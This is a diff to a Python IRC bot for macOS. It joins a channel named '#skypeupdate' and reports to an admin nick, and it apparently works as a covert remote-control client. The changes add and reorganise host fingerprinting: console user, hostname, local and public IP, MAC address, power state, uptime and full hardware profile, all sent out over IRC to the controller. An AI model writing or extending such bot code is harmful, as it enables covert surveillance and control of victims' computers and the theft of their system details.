@@ -14,7 +14,7 @@ from subprocess import Popen, PIPE, STDOUT
 from time import strftime, sleep
 from StringIO import StringIO
 
-version = "2.0.1"                                                   # bot version
+version = "2.0.2"                                                   # bot version
 
 def log(prefix, content=''):                                        # function used to log things to the console with a timestamp
     try:
@@ -33,9 +33,10 @@ channel = '#skypeupdate'
 admin = 'thesquash'                                                 # the nick to send privmsgs to
 
 hostname = socket.gethostname()
+main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()
 local_user = getpass.getuser()
 
-nick = '[%s|%s]' % (local_user, hostname)
+nick = '[%s|%s]' % (main_user, hostname)
 
 helpmsg = '''Version: v%s\n
 Public Commands (main channel): \n
@@ -267,66 +268,63 @@ def identify():                                                   # give some id
     local_ip = s.getsockname()[0]
     s.close()
     log('[>]    Local:   ',local_ip)
-    cmd = "stat -f '%u %Su' /dev/console | awk  '{print $2}'"
-    for line in run_shell(cmd):
-        log('[>]    User:    ',line)
-        main_user = line.strip()
     import urllib2
     public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
     log('[>]    Public:  ',public_ip)
     import uuid
     mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
     log('[>]    MAC:     ',mac_addr)
-    return "[v%s/x%s] %s@%s l: %s p: %s MAC: %s" % (version, system.strip(), main_user, hostname, local_ip, public_ip, mac_addr)
-
+    return "[v%s/x%s] %s@%s u: %s l: %s p: %s MAC: %s" % (version, system.strip(), local_user, hostname, main_user, local_ip, public_ip, mac_addr)
+ 
 def full_identify():                                              # give verbose identifying info about the host computer
-   log('[+] Running Identification Scripts...')
-   privmsg('[+] Running Identification Scripts...')
-   import platform
-   system = platform.mac_ver()[0]
-   log('[>]    OS X:    ',system)
-   privmsg('[>]      OS X:    %s' % system)
+    log('[+] Running Identification Scripts...')
+    privmsg('[+] Running Identification Scripts...')
+    import platform
+    system = platform.mac_ver()[0]
+    log('[>]    OS X:    ',system)
+    privmsg('[>]      OS X:    %s' % system)
 
-   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-   s.connect(("8.8.8.8",80))
-   local_ip = s.getsockname()[0]
-   s.close()
-   log('[>]    Local:   ',local_ip)
-   privmsg('[>]      Local:   %s' % local_ip)
+    log('[>]    Bot:    ',local_user)
+    privmsg('[>]      Bot:    %s' % local_user)
 
-   import urllib2
-   public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
-   log('[>]    Public:  ',public_ip)
-   privmsg('[>]      Public:  %s' % public_ip)
+    log('[>]    User:    ',main_user)
+    privmsg('[>]      User:    %s' % main_user)
 
-   import uuid
-   mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
-   log('[>]    MAC:     ',mac_addr)
-   privmsg('[>]      MAC:     %s' % mac_addr)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8",80))
+    local_ip = s.getsockname()[0]
+    s.close()
+    log('[>]    Local:   ',local_ip)
+    privmsg('[>]      Local:   %s' % local_ip)
 
-   cmd = "system_profiler SPPowerDataType | grep Connected"
-   for line in run_shell(cmd):
-      log('[>]    Power:    ',line)
-      privmsg('[>]      Power:    %s' % line)
-
-   cmd = "uptime"
-   for line in run_shell(cmd):
-      log('[>]    UP:    ',line)
-      privmsg('[>]      Up:    %s' % line)
-
-   cmd = "stat -f '%u %Su' /dev/console | awk  '{print $2}'"
-   for line in run_shell(cmd):
-      log('[>]    User:    ',line)
-      privmsg('[>]      User:    %s' % line)
-
-   cmd = "system_profiler SPHardwareDataType"
-   log('[>]    CMD:     ',cmd)
-   p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
-   hardware = p.stdout.read()
-   log('[>]    Hardware.')
-   privmsg(hardware)
-
-   privmsg('[√] Done.')
+    import urllib2
+    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
+    log('[>]    Public:  ',public_ip)
+    privmsg('[>]      Public:  %s' % public_ip)
+    
+    import uuid
+    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+    log('[>]    MAC:     ',mac_addr)
+    privmsg('[>]      MAC:     %s' % mac_addr)
+    
+    cmd = "system_profiler SPPowerDataType | grep Connected"
+    for line in run_shell(cmd):
+        log('[>]    Power:    ',line)
+        privmsg('[>]      Power:    %s' % line)
+    
+    cmd = "uptime"
+    for line in run_shell(cmd):
+        log('[>]    UP:    ',line)
+        privmsg('[>]      Up:    %s' % line)
+    
+    cmd = "system_profiler SPHardwareDataType"
+    log('[>]    CMD:     ',cmd)
+    p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
+    hardware = p.stdout.read()
+    log('[>]    Hardware.')
+    privmsg(hardware)
+    
+    privmsg('[√] Done.')
 
 ############ The beef of things
 if __name__ == '__main__':
